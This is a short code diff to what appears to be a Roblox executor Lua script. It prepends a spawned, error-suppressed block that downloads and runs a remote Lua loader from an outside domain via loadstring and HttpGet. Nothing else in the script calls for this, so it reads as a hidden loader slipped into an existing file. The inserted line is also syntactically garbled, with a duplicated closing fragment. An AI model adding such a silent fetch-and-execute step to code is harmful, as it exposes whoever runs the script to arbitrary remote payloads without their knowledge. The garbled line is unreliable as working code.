@@ -1,3 +1,8 @@
+task.spawn(function()
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://api.xhider.xyz/files/v4/loaders/ebde4a0a664a29f4ec48ef3f96704291.lua"))()"))()
+    end)
+end)
 if getgenv().__BF_LOADED == game.JobId then
 	return getgenv().__BF_RESULT
 end
